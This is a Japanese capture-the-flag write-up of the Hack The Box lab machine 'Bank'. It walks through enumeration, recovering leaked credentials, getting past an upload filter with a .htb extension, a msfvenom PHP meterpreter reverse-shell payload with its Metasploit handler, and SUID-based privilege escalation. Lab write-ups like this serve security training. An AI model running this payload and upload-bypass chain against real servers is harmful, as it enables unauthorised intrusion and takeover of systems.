# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
現在のランクはHackerです。  
間違っていることも多いかと思いますが、よろしくお願いします。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。
GitHub(ペネトレーションテスト用チートシート):  
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# Bank

HackTheBox公式より  
![スクリーンショット 2020-06-11 16.11.04.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1a5852e4-138d-02fe-b345-fd85f8bad7f7.png)

Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry. There also exists an unintended entry method, which many users find before the correct data is located.

Bankは比較的簡単な機械ですが、入力に必要なデータを見つけるためには、適切なウェブの列挙が鍵となります。また、意図しない入力方法も存在し、正しいデータが見つかる前に多くのユーザーが発見してしまいます。


# スキャン
Bank(10.10.10.29)に対して、スキャンを行います。  
まずnmapからスキャンを開始します。
## nmap 

```
nmap -sC -sV -Pn -p- -oN bank_full.nmap 10.10.10.29
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力
- -Pn...ping送信をせずにスキャンを行う
- -p-...全ポートをスキャン

```
# Nmap 7.80 scan initiated Thu Jun 11 13:33:17 2020 as: nmap -sC -sV -Pn -p- -oN bank.nmap 10.10.10.29
Nmap scan report for 10.10.10.29
Host is up (0.24s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 11 14:04:19 2020 -- 1 IP address (1 host up) scanned in 1862.25 seconds
```

この結果からsshが空いており、DNSサーバとWebサーバの役割を持っていることが分かります。
まずはブラウザからWebサイトにアクセスしてみます。

![スクリーンショット 2020-06-11 16.05.54.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6ccf2105-435e-cfd2-4248-4429d232203b.png)

するとApacheのデフォルトページが表示されるだけで、何も情報を得られるものがありません。  
またgobusterでディレクトリを検索してもヒットするものは何もありませんでした。

```
┌─[✗]─[yukitsukai@parrot]─[~/htb/Bank]
└──╼ $gobuster dir -t 100 -u http://10.10.10.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o bank_gobuster 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.29
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/11 14:34:44 Starting gobuster
===============================================================
===============================================================
2020/06/11 14:38:23 Finished
===============================================================
```

このことからさらにホスト名の推測をすることが必要でした。
推測は苦手なため「hackthebox naming convention」というワードでググって見ると、HackTheBoxフォーラムにてHTBマシンは「machinename.htb」のような命名方式をつける傾向にあると書かれていました。
machinenameはbankであるため、bank.htbになる可能性が高いと考えられます。
このことより/etc/hostsファイルを編集して10.10.10.29をbank.htbとバインドしましょう。

```
┌─[yukitsukai@parrot]─[~]
└──╼ $cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	parrot
10.10.10.29     bank.htb
```

もう一度、bankのWebページにアクセスしてみましょう。

![スクリーンショット 2020-06-11 16.49.47.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e110c90f-a335-e3e3-ded0-10e4cace1a5f.png)

無事アクセスすることができました。
ここでもう一度ホスト名を使ってgobusterでディレクトリの検出を行ってみましょう。

```
┌─[yukitsukai@parrot]─[~/htb/Bank]
└──╼ $gobuster dir -t 100 -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o bank_gobuster 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bank.htb
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/11 14:45:25 Starting gobuster
===============================================================
/uploads (Status: 301)
/assets (Status: 301)
/inc (Status: 301)
/server-status (Status: 403)
/balance-transfer (Status: 301)
===============================================================
2020/06/11 14:54:23 Finished
===============================================================
```

先ほどとは違っていくつかのディレクトリが検出されました。
なにか情報が格納されているディレクトリを探索していると/balance-transferにはログイン情報がハッシュ化して保存されているものが大量に見つかります。

![スクリーンショット 2020-06-11 17.12.32.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/69e5054a-ae7e-d616-d450-af1dd8fb2bb7.png)

![スクリーンショット 2020-06-11 17.12.48.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/cebb4b3d-74b7-eae5-94c8-aa8e8809d192.png)

試しにいくつかCrackStationを使ってパスワードクラックができないかを調べてみたのですが、ログイン情報を割り出すことができません。
そこで上の表示にあるSizeからサイズ順に並び替えて見ると一つだけサイズの小さいファイルがあることが分かります。

![スクリーンショット 2020-06-11 17.18.01.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/8929c706-d7e4-7cb7-ca5c-f46eb7d9aad6.png)

![スクリーンショット 2020-06-11 17.20.04.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1cacf109-da3f-1d91-59ac-72ab2659db72.png)

このファイルにハッシュ化されていないログイン情報が見つかります。
これを使ってlogin.phpでログインしてみましょう。

# 侵入

![スクリーンショット 2020-06-11 17.24.10.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/680208a7-a35e-ed0c-810a-eac71cb63e79.png)

Bank(銀行)らしくお金に関する個人のページにアクセスできました。
ここからSupportのページに飛んでみると、ファイルをアップロードできることが分かります。

![スクリーンショット 2020-06-11 17.30.00.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/3826db9e-8b15-ddc6-0ce2-09df08f961a3.png)

msfvenomを使って、reverse_shellを確立できるペイロードを作成しましょう。

```
┌─[yukitsukai@parrot]─[~/htb/Bank]
└──╼ $msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f raw > reverse.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1111 bytes
```

次に通信を待ち受けるためハンドラをセットしておきます。

```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.14.4
LHOST => 10.10.14.4
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
```

準備も整いさきほどmsfvenomで作成したreverse.phpをアップロードしますが警告文が出てアップロードすることができません。
おそらくアップロードできる拡張子に制限をかけているのでしょう。

![スクリーンショット 2020-06-11 17.30.00.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f2cad8fe-3d3a-bfc2-c3c3-2ca8e831c9fc.png)

ソースコードを見てみると画像のようなコメント文が見つかります。

![スクリーンショット 2020-06-11 17.46.30.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/bef979e9-e844-fcb0-4594-1797691bb9ce.png)


I added the file extension .htb to execute as php for debugging purposes only.
翻訳:デバッグのためにphpとして実行するために拡張子.htbを追加してみました。

phpとして実行するために拡張子.phpを追加したとかかれているので、先ほどのreverse.phpの拡張子を.htbに変更して再度アップロードしてみましょう。

![スクリーンショット 2020-06-11 17.48.30.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/ccf5f954-c9d7-2526-c25f-c1b8e5c31892.png)

無事アップロードすることができました。
次にこれを発火させるために、reverse.htbを実行できるページを見つけましょう。
gobusterの結果からuploadsというディレクトリが検出されているので、そこから実行できるか試してみます。

![スクリーンショット 2020-06-11 17.51.26.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2969454d-0dda-3768-df4f-119079035651.png)

```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Sending stage (38288 bytes) to 10.10.10.29
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.29:36696) at 2020-06-11 17:51:09 +0900

meterpreter > getuid
Server username: www-data (33)
```
ハンドラの方に反応があり、meterpreterを確立できました。


# 特権エスカレーション
いつも通りmeterpreterで接続を確立しているので、local_exploit_suggesterを使って権限昇格に使えそうな物がないか探します。

```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > set session 2
session => 2
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.29 - Collecting local exploits for php/linux...
[-] 10.10.10.29 - No suggestions available.
[*] Post module execution completed
msf5 post(multi/recon/local_exploit_suggester) > 
```

しかし、権限昇格に使えそうなものは何も発見できませんでした。
Windowsではカーネルエクスプロイトが見つかりますが、Linuxではいつも何も見つからない印象です。
別の方法を試してみましょう。

Linuxでは、SUIDビットが有効になっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができます。
SUIDファイルを見つけましょう。
下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができます。
参考:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#suid
https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

```
find / -perm -u=s -type f 2>/dev/null
```

- /は、ファイルシステムの先頭（ルート）から開始し、すべてのディレクトリを検索
- -permは、後続の権限の検索
- -u=sは、rootユーザーが所有するファイルを検索
- -typeは、探しているファイルの種類を示します
- fは、ディレクトリや特殊ファイルではなく、通常のファイルを示す
- 2はプロセスの2番目のファイル記述子であるstderr（標準エラー）を示す
- >はリダイレクトを意味する
- /dev/nullは、書き込まれたすべてのものを破棄する特別なファイルシステムオブジェクト

```
meterpreter > shell
Process 2303 created.
Channel 3 created.
find / -perm -u=s -type f 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

コマンドを実行すると/var/htbの下にemergencyというバイナリファイルが見つかります。
実行してみましょう。

![スクリーンショット 2020-06-11 18.45.53.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/beff618c-7ddd-9f7a-3543-2e2c2557b200.png)

root権限を獲得することができました。
お疲れ様でした。
